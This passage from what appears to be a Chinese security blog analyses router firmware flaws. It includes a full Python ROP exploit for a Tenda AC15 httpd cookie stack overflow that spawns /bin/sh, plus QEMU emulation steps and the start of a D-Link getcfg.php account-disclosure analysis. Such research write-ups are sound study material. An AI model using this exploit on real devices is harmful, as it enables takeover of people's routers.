<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) &lt;= <span class="number">3</span></span><br><span class="line">  || (v42 = <span class="built_in">strchr</span>(s, <span class="number">46</span>)) == <span class="number">0</span></span><br><span class="line">  || (v42 = (<span class="type">char</span> *)v42 + <span class="number">1</span>, <span class="built_in">memcmp</span>(v42, <span class="string">&quot;gif&quot;</span>, <span class="number">3u</span>))</span><br><span class="line">  &amp;&amp; <span class="built_in">memcmp</span>(v42, <span class="string">&quot;png&quot;</span>, <span class="number">3u</span>)</span><br><span class="line">  &amp;&amp; <span class="built_in">memcmp</span>(v42, <span class="string">&quot;js&quot;</span>, <span class="number">2u</span>)</span><br><span class="line">  &amp;&amp; <span class="built_in">memcmp</span>(v42, <span class="string">&quot;css&quot;</span>, <span class="number">3u</span>)</span><br><span class="line">  &amp;&amp; <span class="built_in">memcmp</span>(v42, <span class="string">&quot;jpg&quot;</span>, <span class="number">3u</span>)</span><br><span class="line">  &amp;&amp; <span class="built_in">memcmp</span>(v42, <span class="string">&quot;jpeg&quot;</span>, <span class="number">3u</span>) )</span><br></pre></td></tr></table></figure>
<p>所以新的poc为</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.3/goform/xxx&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=&quot;</span>+<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae&quot;</span>+ <span class="string">&quot;.png&quot;</span>&#125;</span><br><span class="line">requests.get(url=url, cookies=cookie)</span><br></pre></td></tr></table></figure>
<p>并且可以确定偏移量为448</p>
<p>之后就是栈溢出利用了,通过checksec检查http程序，发现开启了NX保护，所以无法直接在栈上执行shellcode，所以寻找gadgets来构造rop链。</p>
<p>因为没有aslr所以vmmap直接能够确定libc基址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xff7e6000 0xff7ed000 ---p     7000   4000 /home/aichch/IOT/_US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin.extracted/squashfs-root/lib/ld-uClibc.so.0</span><br></pre></td></tr></table></figure>
<p>其次，需要找到一个可以控制R0的gadget</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gadget2</span></span><br><span class="line"> sudo pip3 install ropgadget</span><br><span class="line"></span><br><span class="line"> ROPgadget --binary ./lib/libc.so.0  | grep <span class="string">&quot;mov r0, sp&quot;</span></span><br><span class="line"> 0x00040cb8 : mov r0, sp ; blx r3</span><br></pre></td></tr></table></figure>
<p>可以看到，在控制R0之后，这条指令跳转到R3，因此，我们可以再找一条控制R3的gadget</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gadget1</span></span><br><span class="line"> ROPgadget --binary ./lib/libc.so.0 --only <span class="string">&quot;pop&quot;</span>| grep r3</span><br><span class="line"> 0x00018298 : pop &#123;r3, pc&#125;</span><br></pre></td></tr></table></figure>
<p>这样就组成了payload：padding + gadget1 + system_addr + gadget2 + cmd</p>
<p>padding将函数溢出后覆盖返回地址为gadget1，gadget1将system_addr弹出到R3，将gadget2的地址弹出到pc执行gadget2，gadget2将此时栈顶的cmd参数弹出到R0，接着跳转到R3执行system函数。</p>
<p>exp如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"> cmd=<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"> libc_base = <span class="number">0xff7e6000</span></span><br><span class="line"> system_offset = <span class="number">0x0005a270</span></span><br><span class="line"> system_addr = libc_base + system_offset</span><br><span class="line"> gadget1 = libc_base + <span class="number">0x00018298</span></span><br><span class="line"> gadget2 = libc_base + <span class="number">0x00040cb8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> payload = <span class="string">&quot;A&quot;</span>*<span class="number">444</span> +<span class="string">&quot;.png&quot;</span> + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd</span><br><span class="line"></span><br><span class="line"> url = <span class="string">&quot;http://192.168.2.3/goform/xxx&quot;</span></span><br><span class="line"> cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=&quot;</span>+ payload&#125;</span><br><span class="line"> requests.get(url=url, cookies=cookie)</span><br></pre></td></tr></table></figure>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>直接在用户态复现了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-arm-static) ./</span><br><span class="line">sudo <span class="built_in">chroot</span> . ./qemu-arm-static  ./bin/httpd</span><br></pre></td></tr></table></figure>
<p>运行后卡住了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">init_core_dump 1784: rlim_cur = 0, rlim_max = -1</span><br><span class="line">init_core_dump 1794: open core dump success</span><br><span class="line">/bin/sh: can<span class="string">&#x27;t create /proc/sys/kernel/core_pattern: nonexistent directory</span></span><br><span class="line"><span class="string">init_core_dump 1803: rlim_cur = 5120, rlim_max = 5120</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Yes:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      ****** WeLoveLinux****** </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Welcome to ...</span></span><br></pre></td></tr></table></figure>
<p>搜索字符串定位卡住的点,发现存在两个检查，第一个检查network，未通过则进入休眠阶段。第二个检查连接情况，未通过则打印连接失败</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( check_network(v16) &lt;= <span class="number">0</span> )</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">v1 = sleep(<span class="number">1u</span>);</span><br><span class="line"><span class="keyword">if</span> ( ConnectCfm(v1) )</span><br></pre></td></tr></table></figure>
<p>将这两个点patch一下就能过了,netstat观察到服务已启动</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp        0      0 255.255.255.255:81      0.0.0.0:*               LISTEN      1772011/./qemu-arm-</span><br></pre></td></tr></table></figure>
<p>但是ip显然不对劲,分析一下ip是如何得到的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v8 = inet_ntoa(*(<span class="keyword">struct</span> in_addr *)&amp;s.sa_data[<span class="number">2</span>]);</span><br><span class="line">v9 = ntohs(*(<span class="type">uint16_t</span> *)s.sa_data);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;httpd listen ip = %s port = %d\n&quot;</span>, v8, v9);</span><br></pre></td></tr></table></figure>
<p>结合调试以及ida的xref可以知道</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#qemu启动httpd程序目，并开启调试端口</span></span><br><span class="line">sudo <span class="built_in">chroot</span> . ./qemu-arm-static -g 1234 ./bin/httpd</span><br><span class="line"></span><br><span class="line"><span class="comment">#另起终端，gdb-mul连接</span></span><br><span class="line">gdb-multiarch </span><br><span class="line"><span class="built_in">set</span> architecture arm</span><br><span class="line">b *0x1A36C</span><br><span class="line">target remote :1234</span><br></pre></td></tr></table></figure>
<p>是在sub_28338中进行的调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_28338</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [sp+14h] [bp-28h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+24h] [bp-18h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// [sp+28h] [bp-14h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+2Ch] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v8 = g_lan_ip;</span><br><span class="line">  v7 = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_D3D9C = sub_1A36C(v8, a1, (<span class="type">int</span>)websAccept, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dword_D3D9C &gt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>重复上面的步骤，可以得到具体的调用链为：sub_2CEA8（main函数）-&gt; sub_2D3F0(initWebs函数) -&gt; sub_28030 -&gt; sub_28338 -&gt; sub_1A36C</p>
<p>接下来分析printf的ip参数v8进行跟踪：v8关联到s.sa_data[2]，s.sa_data[2]关联到a1，a2</p>
<p>找到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8 = g_lan_ip;</span><br></pre></td></tr></table></figure>
<p>最终找到主函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( getIfIp(LanIfName, v15) &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  GetValue(<span class="string">&quot;lan.ip&quot;</span>, s);</span><br><span class="line">  <span class="built_in">strcpy</span>(g_lan_ip, s);</span><br></pre></td></tr></table></figure>
<p>此处我们进行详细分析，根据函数名猜测getIfIp的作用的是获取ip地址，进入函数查看具体实现。</p>
<p>发现其是导入函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// attributes: thunk</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">getIfIp</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __imp_getIfIp(a1, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据字符串找到这么几个库</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -r <span class="string">&quot;getIfIp&quot;</span> ./lib</span><br><span class="line">匹配到二进制文件 ./lib/libcommon.so</span><br><span class="line">匹配到二进制文件 ./lib/libtpi.so</span><br><span class="line">匹配到二进制文件 ./lib/libxx.so</span><br></pre></td></tr></table></figure>
<p>最终确定漏洞在libcommon.so 中</p>
<p>其是这么一个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">getIfIp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">20</span>]; <span class="comment">// [sp+Ch] [bp-28h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">v8</span>;</span> <span class="comment">// [sp+20h] [bp-14h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [sp+2Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  fd = socket(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, a1, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( ioctl(fd, <span class="number">0x8915</span>u, dest) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = inet_ntoa(v8);</span><br><span class="line">    <span class="built_in">strcpy</span>(a2, v3);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到一个系统调用<code>ioctl(fd, 0x8915u, dest)</code>，查看这个系统调用所实现的功能</p>
<p>一般来讲ioctl在用户程序中的调用是：</p>
<p><code>ioctl(int fd,int command, (char*)argstruct)</code></p>
<p>ioctl调用与网络编程有关，文件描述符fd实际上是由socket()系统调用返回的。参数command的取值由/usr/include/linux/sockios.h 所规定。第三个参数是ifreq结构，在/usr/include/linux/if.h中定义。</p>
<p>最终发现<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.4.262/source/include/uapi/linux/sockios.h">sockios.h - include/uapi/linux/sockios.h - Linux source code (v5.4.262) - Bootlin</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SIOCGIFADDR	0x8915		<span class="comment">/* get PA address		*/</span></span></span><br></pre></td></tr></table></figure>
<p>至于第三个参数,虽然暂时还不懂但是可以看出其是第一个参数a1</p>
<p>返回到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LanIfName = getLanIfName(v2, v3);</span><br><span class="line"><span class="keyword">if</span> ( getIfIp(LanIfName, v15) &lt; <span class="number">0</span> )</span><br></pre></td></tr></table></figure>
<p>进入getLanIfName,这个函数也在libcommon.so中,发现其又是调用get_eth_name</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getLanIfName</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> get_eth_name(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>相同的方法找到其位于libchipapi.so中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *__fastcall <span class="title function_">get_eth_name</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v1; <span class="comment">// r3</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      v1 = <span class="string">&quot;br0&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      v1 = <span class="string">&quot;br1&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      v1 = <span class="string">&quot;eth0.1&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">      v1 = <span class="string">&quot;eth0.2&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">      v1 = <span class="string">&quot;eth0.3&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>终于找到了,确定其就是指定网卡<code>br0</code></p>
<p>所以我们创建一个网卡,不过根据名字其实应该是网桥,所以使用brctl,并指定一个ip</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo ifconfig br0 192.168.2.3/24</span><br></pre></td></tr></table></figure>
<p>再次启动程序,这次正确了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">connect: Connection refused</span><br><span class="line">Connect to server failed.</span><br><span class="line">/bin/sh: can<span class="string">&#x27;t create /etc/httpd.pid: nonexistent directory</span></span><br><span class="line"><span class="string">/bin/sh: can&#x27;</span>t create /proc/sys/net/ipv4/tcp_timestamps: nonexistent directory</span><br><span class="line">[httpd][debug]----------------------------webs.c,157</span><br><span class="line">httpd listen ip = 192.168.2.3 port = 81</span><br><span class="line">webs: Listening <span class="keyword">for</span> HTTP requests at address 192.168.2.3:81</span><br></pre></td></tr></table></figure>
<p>尝试访问,发现错误</p>
<p>运行<code>cp -rf ./webroot_ro/* ./webroot/</code>,即可解决</p>
<p>至此,服务启动完全</p>
<h1 id="CVE-2018-7034"><a href="#CVE-2018-7034" class="headerlink" title="CVE-2018-7034"></a>CVE-2018-7034</h1><p>在<code>/htdocs/web</code>目录下有一个<code>getcfg.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span><span class="keyword">echo</span> <span class="string">&quot;&lt;?&quot;</span>;<span class="meta">?&gt;</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span><span class="meta">&lt;?</span><span class="keyword">echo</span> <span class="string">&quot;?&gt;&quot;</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;postxml&gt;</span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">include</span> <span class="string">&quot;/htdocs/phplib/trace.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&quot;CACHE&quot;</span>] == <span class="string">&quot;true&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">dump</span>(<span class="number">1</span>, <span class="string">&quot;/runtime/session/&quot;</span>.<span class="variable">$SESSION_UID</span>.<span class="string">&quot;/postxml&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$AUTHORIZED_GROUP</span> &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* not a power user, return error message */</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;\t&lt;result&gt;FAILED&lt;/result&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;\t&lt;message&gt;Not authorized&lt;/message&gt;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* cut_count() will return 0 when no or only one token. */</span></span><br><span class="line">		<span class="variable">$SERVICE_COUNT</span> = <span class="title function_ invoke__">cut_count</span>(<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>], <span class="string">&quot;,&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">TRACE_debug</span>(<span class="string">&quot;GETCFG: got &quot;</span>.<span class="variable">$SERVICE_COUNT</span>.<span class="string">&quot; service(s): &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>]);</span><br><span class="line">		<span class="variable">$SERVICE_INDEX</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (<span class="variable">$SERVICE_INDEX</span> &lt; <span class="variable">$SERVICE_COUNT</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$GETCFG_SVC</span> = <span class="title function_ invoke__">cut</span>(<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>], <span class="variable">$SERVICE_INDEX</span>, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">			<span class="title function_ invoke__">TRACE_debug</span>(<span class="string">&quot;GETCFG: serivce[&quot;</span>.<span class="variable">$SERVICE_INDEX</span>.<span class="string">&quot;] = &quot;</span>.<span class="variable">$GETCFG_SVC</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$GETCFG_SVC</span>!=<span class="string">&quot;&quot;</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$file</span> = <span class="string">&quot;/htdocs/webinc/getcfg/&quot;</span>.<span class="variable">$GETCFG_SVC</span>.<span class="string">&quot;.xml.php&quot;</span>;</span><br><span class="line">				<span class="comment">/* GETCFG_SVC will be passed to the child process. */</span></span><br><span class="line">				<span class="keyword">if</span> (<span class="title function_ invoke__">isfile</span>(<span class="variable">$file</span>)==<span class="string">&quot;1&quot;</span>) <span class="title function_ invoke__">dophp</span>(<span class="string">&quot;load&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$SERVICE_INDEX</span>++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;/postxml&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到第<code>34</code>行会加载进来一个文件，而该文件的路径在第<code>32</code>行，其中<code>$GETCFG_SVC</code>是通过<code>POST</code>请求传进来的<code>$_POST[&quot;SERVICES&quot;]</code>，因此，这个任意文件的加载是我们可控的。但是，前提是要满足<code>$AUTHORIZED_GROUP &gt;= 0</code>。</p>
<p>那么我们加载什么文件呢？这个文件的路径得在<code>/htdocs/webinc/getcfg</code>目录下，且后缀得是<code>.xml.php</code>，我们关注到了<code>/htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php</code>这个文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="string">&quot;/device/account/entry&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$InDeX</span> &gt; <span class="variable">$cnt</span>) <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\t\t\t&lt;entry&gt;\n&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;uid&gt;&quot;</span>.		<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;uid&quot;</span>).	<span class="string">&quot;&lt;/uid&gt;\n&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;name&gt;&quot;</span>.		<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;name&quot;</span>).	<span class="string">&quot;&lt;/name&gt;\n&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;usrid&gt;&quot;</span>.		<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;usrid&quot;</span>).	<span class="string">&quot;&lt;/usrid&gt;\n&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;password&gt;&quot;</span>.	<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;password&quot;</span>).<span class="string">&quot;&lt;/password&gt;\n&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;group&gt;&quot;</span>.		<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;group&quot;</span>).	<span class="string">&quot;&lt;/group&gt;\n&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;description&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;description&quot;</span>).<span 